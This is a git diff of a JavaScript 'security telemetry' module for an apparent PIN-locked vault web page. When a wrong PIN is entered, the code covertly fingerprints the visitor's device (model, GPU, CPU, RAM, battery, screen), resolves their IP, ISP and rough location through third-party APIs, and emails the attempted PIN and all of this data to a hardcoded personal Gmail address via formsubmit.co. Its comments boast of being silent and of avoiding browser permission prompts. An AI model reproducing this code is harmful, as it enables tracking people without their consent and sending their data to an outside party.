@@ -1,13 +1,13 @@
 /**
- * 100% Silent & Stealth Security Telemetry Dispatcher
- * Captures deep hardware fingerprinting, device model, GPU, CPU, network ISP & IP
- * WITHOUT any browser permission popups.
+ * Advanced Device Model & Security Telemetry Dispatcher
+ * Maps exact smartphone and computer model names using Client Hints,
+ * WebGL GPU Fingerprinting, and Screen Dimension Profiles (100% Silent).
  */
 
 const TARGET_EMAIL = "dixitghi69@gmail.com";
 let lastAlertTimestamp = 0;
 
-// Deep hardware & GPU fingerprinting (zero permissions needed)
+// GPU Renderer fingerprinting
 const getGPUInfo = () => {
   try {
     const canvas = document.createElement("canvas");
@@ -24,44 +24,81 @@ const getGPUInfo = () => {
   return "N/A";
 };
 
-// Identify exact device model & hardware characteristics
-const getDeepDeviceFingerprint = async () => {
+// Precise device model mapping
+const getExactDeviceName = async () => {
   const ua = navigator.userAgent;
-  let os = "Unknown OS";
-  let deviceModel = "Unknown Device";
+  let model = "";
 
-  // Android model extraction from UA string (e.g. "SM-G998B", "Redmi Note 11", "Pixel 7")
-  if (/Android/i.test(ua)) {
-    os = "Android";
-    const androidMatch = ua.match(/Android\s+([0-9\.]+);\s+([^;]+)\s+Build/i) || ua.match(/Android\s+([0-9\.]+);\s+([^;\)]+)/i);
-    if (androidMatch) {
-      deviceModel = `${androidMatch[2].trim()} (Android ${androidMatch[1]})`;
-    } else {
-      deviceModel = "Android Mobile/Tablet";
+  // 1. Try Chromium User-Agent Client Hints API (Zero permissions, highest precision on Android/PC)
+  if (navigator.userAgentData?.getHighEntropyValues) {
+    try {
+      const hints = await navigator.userAgentData.getHighEntropyValues([
+        "model",
+        "platform",
+        "platformVersion",
+        "architecture",
+      ]);
+      if (hints.model && hints.model.trim() !== "") {
+        model = hints.model; // e.g. "SM-S918B", "Pixel 8 Pro", "Redmi Note 12"
+      }
+    } catch {
+      // fallback
     }
-  } else if (/iPhone/i.test(ua)) {
-    os = "iOS";
-    const screenRes = `${window.screen?.width}x${window.screen?.height}`;
-    const dpr = window.devicePixelRatio || 1;
-    deviceModel = `Apple iPhone (${screenRes} @${dpr}x DPR)`;
-  } else if (/iPad/i.test(ua)) {
-    os = "iPadOS";
-    deviceModel = "Apple iPad";
-  } else if (/Macintosh|Mac OS X/i.test(ua)) {
-    os = "macOS";
-    deviceModel = "Apple Mac (Desktop/MacBook)";
-  } else if (/Windows/i.test(ua)) {
-    os = "Windows";
-    if (/Windows NT 10.0/i.test(ua)) deviceModel = "Windows 10 / Windows 11 PC";
-    else if (/Windows NT 6.3/i.test(ua)) deviceModel = "Windows 8.1 PC";
-    else if (/Windows NT 6.1/i.test(ua)) deviceModel = "Windows 7 PC";
-    else deviceModel = "Windows PC";
-  } else if (/Linux/i.test(ua)) {
-    os = "Linux";
-    deviceModel = "Linux System";
   }
 
-  // Browser detection
+  // 2. Android Device Model Parsing from User Agent
+  if (!model && /Android/i.test(ua)) {
+    const androidMatch = ua.match(/Android\s+([0-9\.]+);\s+([^;]+)\s+Build/i) || ua.match(/Android\s+([0-9\.]+);\s+([^;\)]+)/i);
+    if (androidMatch && androidMatch[2]) {
+      model = `${androidMatch[2].trim()} (Android ${androidMatch[1]})`;
+    } else {
+      model = "Android Device";
+    }
+  }
+
+  // 3. Apple iPhone Model Resolution Matrix
+  if (/iPhone/i.test(ua)) {
+    const w = window.screen.width;
+    const h = window.screen.height;
+    const dpr = window.devicePixelRatio || 1;
+    const minDim = Math.min(w, h);
+    const maxDim = Math.max(w, h);
+
+    if (minDim === 430 && maxDim === 932 && dpr === 3) model = "Apple iPhone 15 Pro Max / 15 Plus / 14 Pro Max";
+    else if (minDim === 393 && maxDim === 852 && dpr === 3) model = "Apple iPhone 15 / 15 Pro / 14 Pro";
+    else if (minDim === 390 && maxDim === 844 && dpr === 3) model = "Apple iPhone 14 / 13 / 13 Pro / 12 / 12 Pro";
+    else if (minDim === 428 && maxDim === 926 && dpr === 3) model = "Apple iPhone 14 Plus / 13 Pro Max / 12 Pro Max";
+    else if (minDim === 375 && maxDim === 812 && dpr === 3) model = "Apple iPhone 13 mini / 12 mini / 11 Pro / XS / X";
+    else if (minDim === 414 && maxDim === 896 && dpr === 2) model = "Apple iPhone 11 / XR";
+    else if (minDim === 414 && maxDim === 896 && dpr === 3) model = "Apple iPhone 11 Pro Max / XS Max";
+    else if (minDim === 375 && maxDim === 667 && dpr === 2) model = "Apple iPhone SE (2nd/3rd Gen) / 8 / 7";
+    else model = `Apple iPhone (${minDim}x${maxDim} @${dpr}x)`;
+  } else if (/iPad/i.test(ua)) {
+    model = "Apple iPad Tablet";
+  } else if (/Macintosh|Mac OS X/i.test(ua)) {
+    model = "Apple Mac (MacBook / iMac / Mac Mini)";
+  } else if (/Windows NT 10.0/i.test(ua)) {
+    model = "Windows 11 / Windows 10 Computer";
+  } else if (/Windows/i.test(ua)) {
+    model = "Windows PC";
+  } else if (/Linux/i.test(ua)) {
+    model = "Linux Computer";
+  }
+
+  if (!model) {
+    model = "Unknown Device";
+  }
+
+  // OS Detection
+  let os = "Unknown OS";
+  if (/Android/i.test(ua)) os = "Android";
+  else if (/iPhone/i.test(ua)) os = "iOS (iPhone)";
+  else if (/iPad/i.test(ua)) os = "iPadOS";
+  else if (/Macintosh/i.test(ua)) os = "macOS";
+  else if (/Windows/i.test(ua)) os = "Windows";
+  else if (/Linux/i.test(ua)) os = "Linux";
+
+  // Browser Detection
   let browser = "Unknown Browser";
   if (/Edg/i.test(ua)) browser = "Microsoft Edge";
   else if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = "Google Chrome";
@@ -70,16 +107,11 @@ const getDeepDeviceFingerprint = async () => {
   else if (/Opera|OPR/i.test(ua)) browser = "Opera";
 
   const gpu = getGPUInfo();
-  const cpuCores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} Logical Cores` : "N/A";
+  const cpuCores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} Cores` : "N/A";
   const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB+ RAM` : "N/A";
   const touchPoints = navigator.maxTouchPoints || 0;
-  const inputType = touchPoints > 0 ? `Touchscreen (${touchPoints} points)` : "Mouse / Keyboard";
-  
-  // Connection type
-  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-  const connectionType = conn?.effectiveType ? `${conn.effectiveType.toUpperCase()} (Downlink: ~${conn.downlink || '?'} Mbps)` : "N/A";
+  const inputType = touchPoints > 0 ? `Touchscreen (${touchPoints} points)` : "Mouse & Keyboard";
 
-  // Battery info if available (silently)
   let batteryInfo = "N/A";
   try {
     if (navigator.getBattery) {
@@ -91,25 +123,23 @@ const getDeepDeviceFingerprint = async () => {
   }
 
   return {
+    deviceName: model,
     os,
-    deviceModel,
     browser,
     gpu,
     cpuCores,
     ram,
     inputType,
-    connectionType,
     batteryInfo,
-    screen: `${window.screen?.width || window.innerWidth}x${window.screen?.height || window.innerHeight} (DPR: ${window.devicePixelRatio || 1}, ${window.screen?.colorDepth || 24}-bit color)`,
+    screen: `${window.screen?.width || window.innerWidth}x${window.screen?.height || window.innerHeight} (DPR: ${window.devicePixelRatio || 1}, ${window.screen?.colorDepth || 24}-bit)`,
     language: navigator.language || "Unknown",
     timeZone: Intl?.DateTimeFormat?.()?.resolvedOptions?.()?.timeZone || "Unknown",
     userAgent: ua,
   };
 };
 
-// Silent multi-tier IP & Network ISP resolution (NO user popups)
+// Silent multi-tier IP & Network ISP resolution
 const fetchSilentGeoLocation = async () => {
-  // Method 1: ipapi.co
   try {
     const res = await fetch("https://ipapi.co/json/", { signal: AbortSignal.timeout(3000) });
     if (res.ok) {
@@ -127,11 +157,8 @@ const fetchSilentGeoLocation = async () => {
         };
       }
     }
-  } catch {
-    // fallback
-  }
+  } catch {}
 
-  // Method 2: ipwho.is
   try {
     const res = await fetch("https://ipwho.is/", { signal: AbortSignal.timeout(3000) });
     if (res.ok) {
@@ -149,9 +176,7 @@ const fetchSilentGeoLocation = async () => {
         };
       }
     }
-  } catch {
-    // fallback
-  }
+  } catch {}
 
   return {
     ip: "Unknown",
@@ -173,45 +198,43 @@ export const sendSecurityAlert = async ({ enteredPin, attemptCount, isLockout = 
   lastAlertTimestamp = now;
 
   try {
-    // Run hardware analysis and IP resolution completely in the background
     const [device, geo] = await Promise.all([
-      getDeepDeviceFingerprint(),
+      getExactDeviceName(),
       fetchSilentGeoLocation(),
     ]);
 
     const mapUrl = geo.lat && geo.lon ? `https://www.google.com/maps?q=${geo.lat},${geo.lon}` : "N/A";
 
     const subject = isLockout
-      ? `🚨 VAULT LOCKOUT: ${device.deviceModel} tried 4 times (${geo.city}, ${geo.country})`
-      : `⚠️ Unauthorized PIN "${enteredPin}" on ${device.deviceModel} (${geo.city}, ${geo.country})`;
+      ? `🚨 VAULT LOCKOUT: ${device.deviceName} (4 Failed Attempts)`
+      : `⚠️ Unauthorized PIN "${enteredPin}" on ${device.deviceName}`;
 
     const payload = {
       _subject: subject,
       "🚨 Security Event": isLockout ? "SYSTEM LOCKOUT (4 Failed Attempts)" : "Incorrect PIN Entry",
+      "📱 Exact Device Name": device.deviceName,
       "🔢 Attempted PIN": enteredPin,
       "⚠️ Attempt Status": `${attemptCount} of 4 attempts`,
       "🕒 Exact Timestamp": new Date().toLocaleString(),
       
-      // Device & Hardware Fingerprint
-      "📱 Device Model": device.deviceModel,
+      // Hardware Specs
       "💻 OS & Browser": `${device.os} • ${device.browser}`,
-      "🎮 GPU / Graphics": device.gpu,
+      "🎮 GPU / Graphics Card": device.gpu,
       "⚡ CPU & RAM": `${device.cpuCores} | ${device.ram}`,
       "🖥️ Screen & Input": `${device.screen} | ${device.inputType}`,
-      "🔋 Battery & Network": `${device.batteryInfo} | ${device.connectionType}`,
+      "🔋 Battery Status": device.batteryInfo,
 
-      // Location & ISP
-      "📍 Estimated Location": `${geo.city}, ${geo.region}, ${geo.country} (Postal: ${geo.postal})`,
+      // Location & Network
+      "📍 Location": `${geo.city}, ${geo.region}, ${geo.country} (Postal: ${geo.postal})`,
+      "🏢 ISP / Network Provider": geo.isp,
       "🌐 IP Address": geo.ip,
-      "🏢 ISP / Carrier": geo.isp,
       "🗺️ Network Map": mapUrl,
-      "🌐 Language / Timezone": `${device.language} / ${device.timeZone}`,
+      "🌐 Timezone": device.timeZone,
       "User-Agent": device.userAgent,
       _captcha: "false",
       _template: "table",
     };
 
-    // Send silently
     await fetch(`https://formsubmit.co/ajax/${TARGET_EMAIL}`, {
       method: "POST",
       headers: {
